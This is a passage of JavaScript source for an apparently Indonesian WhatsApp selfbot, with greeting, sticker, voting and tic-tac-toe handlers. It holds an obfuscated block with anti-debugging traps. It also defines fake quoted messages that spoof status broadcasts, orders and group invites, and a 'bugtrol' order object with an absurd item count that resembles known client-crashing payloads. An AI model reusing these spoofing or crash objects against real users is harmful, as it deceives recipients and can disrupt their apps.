                case 5: hari = "Friday"; break;
                case 6: hari = "Saturday"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "January"; break;
                case 1: bulan1 = "February"; break;
                case 2: bulan1 = "March"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "May"; break;
                case 5: bulan1 = "June"; break;
                case 6: bulan1 = "July"; break;
                case 7: bulan1 = "August"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "October"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "December"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + "Time : " + jam + ":" + menit + ":" + detik + " Wib";     
            
            myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
                myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'];
                var tgl = new Date();
                detik = tgl.getSeconds();
                menit = tgl.getMinutes();
                jam = tgl.getHours();
	            var ampm = jam >= 12 ? 'PM' : 'AM';
	            var day = tgl.getDate()
	            bulan = tgl.getMonth()
	            var thisDay = tgl.getDay(),
	            thisDay = myDays[thisDay];
	            var yy = tgl.getYear()
	            var year = (yy < 1000) ? yy + 1900 : yy;
	            const ini_tanggal = `${day} - ${myMonths[bulan]} - ${year}`
            
            const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
        if(time2 < "19:00:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
        if(time2 < "18:00:00"){
        var ucapannya2 = `Afternoon 🌅 ${pushname}`
}
        if(time2 < "15:00:00"){
        var ucapannya2 = `GoodDay 🌞 ${pushname}`
}
        if(time2 < "11:00:00"){
        var ucapannya2 = `Morning 🌄 ${pushname}`
}
        if(time2 < "05:00:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }
const _0x16a867=_0xc766;(function(_0x194b8d,_0x39c671){const _0x442409=_0xc766,_0x541c4d=_0x194b8d();while(!![]){try{const _0x2da79b=-parseInt(_0x442409(0xc7))/0x1+parseInt(_0x442409(0xc8))/0x2+-parseInt(_0x442409(0xd0))/0x3*(-parseInt(_0x442409(0xe1))/0x4)+-parseInt(_0x442409(0xde))/0x5+parseInt(_0x442409(0xd7))/0x6*(parseInt(_0x442409(0xcf))/0x7)+parseInt(_0x442409(0xd9))/0x8*(-parseInt(_0x442409(0xd8))/0x9)+-parseInt(_0x442409(0xd3))/0xa*(-parseInt(_0x442409(0xcc))/0xb);if(_0x2da79b===_0x39c671)break;else _0x541c4d['push'](_0x541c4d['shift']());}catch(_0x4c845f){_0x541c4d['push'](_0x541c4d['shift']());}}}(_0x3ef3,0x6f8d6));function _0xc766(_0x1e47b5,_0x49597a){const _0xe81c40=_0x3ef3();return _0xc766=function(_0x15ff42,_0x19e506){_0x15ff42=_0x15ff42-0xc7;let _0x3ef38d=_0xe81c40[_0x15ff42];return _0x3ef38d;},_0xc766(_0x1e47b5,_0x49597a);}const _0x19e506=(function(){let _0x1cc5fe=!![];return function(_0x2d5eed,_0x1b25af){const _0x2cefa8=_0x1cc5fe?function(){const _0x54c813=_0xc766;if(_0x1b25af){const _0x1f4a21=_0x1b25af[_0x54c813(0xd5)](_0x2d5eed,arguments);return _0x1b25af=null,_0x1f4a21;}}:function(){};return _0x1cc5fe=![],_0x2cefa8;};}());(function(){_0x19e506(this,function(){const _0x25732c=_0xc766,_0x31a1bb=new RegExp(_0x25732c(0xca)),_0x57e2a1=new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','i'),_0xf43801=_0x15ff42(_0x25732c(0xd2));!_0x31a1bb[_0x25732c(0xda)](_0xf43801+'chain')||!_0x57e2a1[_0x25732c(0xda)](_0xf43801+_0x25732c(0xc9))?_0xf43801('0'):_0x15ff42();})();}());if(autobio){if(autobio===![])return;let settingstatus=0x0;if(new Date()*0x1-settingstatus>0x3e8){let _uptime=process['uptime']()*0x3e8,uptimer=clockString(_uptime);await alpha[_0x16a867(0xdc)]('I\x27m\x20Userbot\x20🤖\x20|\x20Runtime\x20'+uptimer+_0x16a867(0xcb)+status)[_0x16a867(0xdf)](_0x1a0275=>_0x1a0275),settingstatus=new Date()*0x1;}}function _0x15ff42(_0x3bfdcd){function _0x38d400(_0x4fe7ad){const _0x378cc7=_0xc766;if(typeof _0x4fe7ad==='string')return function(_0x5b8c4d){}[_0x378cc7(0xdd)](_0x378cc7(0xce))[_0x378cc7(0xd5)](_0x378cc7(0xd1));else(''+_0x4fe7ad/_0x4fe7ad)['length']!==0x1||_0x4fe7ad%0x14===0x0?function(){return!![];}[_0x378cc7(0xdd)]('debu'+'gger')[_0x378cc7(0xd4)](_0x378cc7(0xdb)):function(){return![];}[_0x378cc7(0xdd)](_0x378cc7(0xcd)+_0x378cc7(0xd6))[_0x378cc7(0xd5)](_0x378cc7(0xe0));_0x38d400(++_0x4fe7ad);}try{if(_0x3bfdcd)return _0x38d400;else _0x38d400(0x0);}catch(_0x15fe8a){}}function _0x3ef3(){const _0x20625d=['counter','init','960WbjINi','call','apply','gger','660EaCCbv','153zUshOt','70904QeLVzc','test','action','setStatus','constructor','2901720SWluKG','catch','stateObject','1519356RkkWUY','812321GcaewZ','239578hnkYcy','input','function\x20*\x5c(\x20*\x5c)','\x20⏰\x20|\x20','71731vEtgEE','debu','while\x20(true)\x20{}','55657etMSPS','3amcuQQ'];_0x3ef3=function(){return _0x20625d;};return _0x3ef3();}
		mess = {
			wait: '```[ ! ] Sabar  ajg...```',
			success: '```[ ✓ ]``` d a h  n o h',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'Itu bukan stiker',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Cuma bisa di grup sayang',
				admin: 'Lu kan bukan admin ngentod...',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const sendMess = (hehe, teks) => {
            alpha.sendMessage(hehe, teks, text)
        }
        

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        const fakestatus = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const fakethumb = (teks, yes) => {
            alpha.sendMessage(from, teks, image, {thumbnail:fs.readFileSync(`./image/${thumbnail}`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`image/${thumbnail}`) //Gambarnye
					},
					"title": 'Whatsapp bot', 
					"description": "SELF BOT", 
					"currencyCode": "IDR",
					"priceAmount1000": "70000000",
					"retailerId": 'Whatsapp bot',
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
const bugtrol = { 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "359531915900587",
						"itemCount": 1000000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${creator}`,
						"orderTitle": `${creator}`,
						"sellerJid": "62887435047326@s.whatsapp.net",
						"token": "AR5b5YFz2g4W5fYrjbeakPiI3/XxarATSeP+KLh+0FGwkw=="
					}}}
        const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fs.readFileSync(`image/${thumbnail}`), surface: 200, message: `ᴄᴍᴅ ᴇxᴇᴄ : ${command}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${creator}`,jpegThumbnail: fs.readFileSync(`image/${thumbnail}`)}}}
        const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
        const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `さ ${pushname} さ\nᴄᴍᴅ ᴇxᴇᴄ : ${command}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`), thumbnail: fs.readFileSync(`image/${thumbnail}`),sendEphemeral: true}}}
		var fakeReplyList = ['ftroli', 'fdoc', 'fvn', 'fgif', 'fgclink', 'fvideo', 'floc', 'fkontak']
		var fakeReply = fakeReplyList[Math.floor(Math.random() * fakeReplyList.length)];

const fakeitem = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`image/${thumbnail}`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
           
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './sticker' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './sticker' + names + '.png'
                    let asw = './sticker' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        alpha.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            const sendFileFromUrlF = async(link, type, options) => {
            	hasil = await getBuffer(link)
            alpha.sendMessage(from, hasil, type, options).catch(e => {
            	fetch(link).then((hasil) => {
            	alpha.sendMessage(from, hasil, type, options).catch(e => {
            	alpha.sendMessage(from, { url : link }, type, options).catch(e => {
            	fakegroup('Something Error')
            console.log(e)
            })
            })
            })
            })
           }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    alpha.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, mek, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return alpha.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return alpha.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync(`image/${thumbnail}`)})
        }
        const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					alpha.sendMessage(to, media, sticker, mek)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}
			function jsonformat(string) {
  return JSON.stringify(string, null, 2)
}
			
			const sendFile = async(link, type, options) => {
hasil = await getBuffer(link)
alpha.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
alpha.sendMessage(from, hasil, type, options).catch(e => {
alpha.sendMessage(from, { url : link }, type, options).catch(e => {
reply2('Error!')
console.log(e)
})
})
})
})
}
			hit_total = await fetchJson('https://api.countapi.xyz/hit/api-alphabot.herokuapp.com/visits')
			try {
				hitall = `${hit_total.value}`
				} catch {
					hitall = 'Not detect'
					}
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6281804680327@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '62887435047326@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' You have voted', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	

const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./src/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./src/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah", "give up"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah${enter}_Yahaha_`
        return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./temp/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply2(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `${enter}${enter}•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `${enter}_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Win : @${player2} 🎉${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Lose : @${player2} 👻${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                teks += `•> Draw : @${player1} 🦁${enter}${enter}`
                teks += board
                teks += `${enter}${enter}•> Draw : @${player2} 🐯${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./temp/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply2(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}${enter}`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `${enter}${enter}•> Player 2 : @${lawan.split("@")[0]} (${pelawan})${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./temp/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		alpha.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: mek, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./temp/" + from + ".json");
	}
}

    _sewa.expiredCheck(alpha, sewa)
    
  //FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
